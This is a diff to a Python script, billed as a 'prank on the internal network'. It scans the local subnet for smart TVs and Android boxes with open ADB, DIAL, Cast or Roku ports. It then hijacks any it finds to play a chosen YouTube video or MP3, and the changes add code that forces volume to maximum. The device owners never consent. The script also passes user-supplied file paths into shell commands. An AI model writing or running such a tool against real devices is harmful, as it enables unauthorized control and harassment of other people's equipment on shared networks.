@@ -1,9 +1,11 @@
+from concurrent.futures import ThreadPoolExecutor, as_completed
 import socket
 import sys
 import os
 import re
 import requests
 import time
+import subprocess
 
 try:
     import pychromecast
@@ -16,15 +18,15 @@ def print_banner():
     banner = """
  ______   __  __     ______     ______     ______   __   __
 /\\__  _\\ /\\ \\/\\ \\   /\\  == \\   /\\  ___\\   /\\__  _\\ /\\ \\ / /
-\\/_/\\ \\/ \\ \\ \\_\\ \\  \\ \\  __<   \\ \\  __\\   \\/_/\\ \\/ \\ \\ \\'/ 
-   \\ \\_\\  \\ \\_____\\  \\ \\_____\\  \\ \\_____\\    \\ \\_\\  \\ \\__| 
-    \\/_/   \\/_____/   \\/_____/   \\/_____/     \\/_/   \\/_/  
-     Let's play a prank with a video!"""
+\\/_/\\ \\/ \\ \\ \\_\\ \\  \\ \\  __<   \\ \\  __\\   \\/_/\\ \\/ \\ \\ \\'/
+   \\ \\_\\  \\ \\_____\\  \\ \\_____\\  \\ \\_____\\    \\ \\_\\  \\ \\__|
+    \\/_/   \\/_____/   \\/_____/   \\/_____/     \\/_/   \\/_/
+       A prank on the internal network."""
     print(banner)
 
 def scan_network():
-    print("[...] Wait a minute.")
-    
+    print("[...] Searching")
+
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
@@ -35,26 +37,47 @@ def scan_network():
         ip_prefix = "192.168.1."
 
     devices = []
-    ports_to_scan = [5555, 8008, 8009]
+    ports_to_scan = [5555, 8008, 8009, 1900, 8060, 36866, 7676]
 
-    for i in range(1, 255):
-        ip = f"{ip_prefix}{i}"
-        for port in ports_to_scan:
+    def check_port(ip, port):
+        try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            sock.settimeout(0.04)
+            sock.settimeout(0.5)
             result = sock.connect_ex((ip, port))
+            sock.close()
             if result == 0:
                 if port == 5555:
                     dev_type = "Android Box (ADB)"
                 elif port == 8008:
                     dev_type = "Smart TV (DIAL)"
-                else:
+                elif port == 8009:
                     dev_type = "Google Cast"
-                
-                if not any(d['ip'] == ip for d in devices):
-                    devices.append({"ip": ip, "port": port, "type": dev_type})
-            sock.close()
-            
+                elif port == 8060:
+                    dev_type = "Roku TV Service"
+                else:
+                    dev_type = f"Smart TV/Media Render (Port {port})"
+                return {"ip": ip, "port": port, "type": dev_type}
+        except Exception:
+            pass
+        return None
+
+    tasks = []
+    for i in range(1, 255):
+        ip = f"{ip_prefix}{i}"
+        for port in ports_to_scan:
+            tasks.append((ip, port))
+
+    discovered_ips = set()
+    with ThreadPoolExecutor(max_workers=100) as executor:
+        futures = {executor.submit(check_port, ip, port): ip for ip, port in tasks}
+
+        for future in as_completed(futures):
+            res = future.result()
+            if res:
+                if res["ip"] not in discovered_ips:
+                    discovered_ips.add(res["ip"])
+                    devices.append(res)
+
     return devices
 
 def extract_video_id(url):
@@ -62,18 +85,29 @@ def extract_video_id(url):
     match = re.search(regex, url)
     return match.group(1) if match else None
 
+def force_max_volume_adb(ip):
+    print("[...] Boosting ADB Volume")
+    os.system(f"adb -s {ip}:5555 shell media volume --set 15 > /dev/null 2>&1")
+    os.system(f"adb -s {ip}:5555 shell media volume --set 100 > /dev/null 2>&1")
+
+def force_max_volume_catt(ip):
+    if os.system("command -v catt > /dev/null 2>&1") == 0:
+        print("[...] Boosting CATT Volume...")
+        os.system(f"catt -d {ip} volume 100 > /dev/null 2>&1")
+
 def play_via_adb(ip, video_id):
-    if os.system("command -v adb > /dev/null 2>&1") != 0:
-        os.system("pkg install android-tools -y > /dev/null 2>&1")
-        
     os.system(f"adb disconnect {ip}:5555 > /dev/null 2>&1")
     os.system(f"adb connect {ip}:5555 > /dev/null 2>&1")
-    
+
+    force_max_volume_adb(ip)
+
     cmd = f'adb shell am start -a android.intent.action.VIEW -d "https://youtu.be/{video_id}" > /dev/null 2>&1'
     os.system(cmd)
     return True
 
 def play_via_dial(ip, video_id):
+    force_max_volume_catt(ip)
+
     url = f"http://{ip}:8008/apps/YouTube"
     payload = f"data=videos%2F{video_id}"
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
@@ -84,8 +118,10 @@ def play_via_dial(ip, video_id):
         return False
 
 def play_via_cast(ip, video_id):
-    if not HAS_CHROMECAST: 
-        return False
+    force_max_volume_catt(ip)
+
+    if not HAS_CHROMECAST:
+        return os.system(f"catt -d {ip} cast 'https://youtu.be/{video_id}' > /dev/null 2>&1") == 0
     try:
         chromecasts, browser = pychromecast.get_chromecasts()
         cast = None
@@ -105,54 +141,84 @@ def play_via_cast(ip, video_id):
     except Exception:
         return False
 
+def play_local_mp3(selected_dev, file_path):
+    ip = selected_dev["ip"]
+
+    if not os.path.exists(file_path):
+        print(f"[!] Error: File not found: {file_path}")
+        return False
+
+    force_max_volume_catt(ip)
+
+    print(f"[+] Casting local MP3: {os.path.basename(file_path)}")
+    subprocess.Popen(f"catt -d {ip} cast \"{file_path}\" > /dev/null 2>&1", shell=True)
+    return True
+
 def main():
     print_banner()
     devices = scan_network()
-    
+
     if not devices:
-        print("[-] No target found online.")
+        print("[-] No targets found.")
         return
 
-    print("[!] Here's our target!")
+    print("[!] Available targets:")
     for index, dev in enumerate(devices, 1):
-        print(f"    [{index}] [{dev['ip']}] [{dev['port']}]")
+        print(f"    [{index}] [{dev['ip']}] [{dev['port']}] -> {dev['type']}")
     print("")
 
     try:
-        choice = int(input("[?] Choose your goal: "))
+        choice = int(input("[?] Target index: "))
         if choice < 1 or choice > len(devices):
-            print("[!] Invalid selection!")
+            print("[!] Invalid index!")
             return
     except ValueError:
-        print("[!] Please enter a number!")
+        print("[!] Numeric input required!")
         return
 
     selected_dev = devices[choice - 1]
-    
-    youtube_url = input("[?] Enter the YouTube video link: ").strip()
-    
-    print("[...] Waiting for processing")
-    video_id = extract_video_id(youtube_url)
-    
-    if not video_id:
-        print("[!] Error: Could not extract YouTube Video ID!")
-        return
+    is_adb_only = (selected_dev["port"] == 5555)
 
-    success = False
-    if selected_dev["port"] == 5555:
-        success = play_via_adb(selected_dev["ip"], video_id)
-    elif selected_dev["port"] == 8008:
-        success = play_via_dial(selected_dev["ip"], video_id)
-    elif selected_dev["port"] == 8009:
-        success = play_via_cast(selected_dev["ip"], video_id)
+    youtube_url = input("[?] YouTube URL: ").strip()
+    
+    mp3_path = ""
+    if not is_adb_only:
+        mp3_path = input("[?] Local MP3 Path: ").strip()
+        mp3_path = mp3_path.replace('"', '').replace("'", "")
     else:
-        success = play_via_dial(selected_dev["ip"], video_id)
+        print("[i] ADB mode detected: Local MP3 disabled.")
 
-    if success:
-        print(f"       Link: {youtube_url} successful")
-        print("       The video has been played.")
+    if youtube_url:
+        print("[...] Processing YouTube request...")
+        video_id = extract_video_id(youtube_url)
+
+        if not video_id:
+            print("[!] Error: Invalid YouTube URL!")
+            return
+
+        success = False
+        if selected_dev["port"] == 5555:
+            success = play_via_adb(selected_dev["ip"], video_id)
+        elif selected_dev["port"] == 8009:
+            success = play_via_cast(selected_dev["ip"], video_id)
+        else:
+            success = play_via_dial(selected_dev["ip"], video_id)
+
+        if success:
+            print("[+] Target execution completed successfully.")
+        else:
+            print("[-] Target command failed.")
+
+    elif mp3_path:
+        print("[...] Processing MP3 request")
+        success = play_local_mp3(selected_dev, mp3_path)
+        if success:
+            print("[+] Media stream initiated.")
+        else:
+            print("[-] Media stream failed.")
+            
     else:
-        print("       [!] Failed to send command to the target TV.")
+        print("[!] No input provided.")
 
 if __name__ == "__main__":
     main()
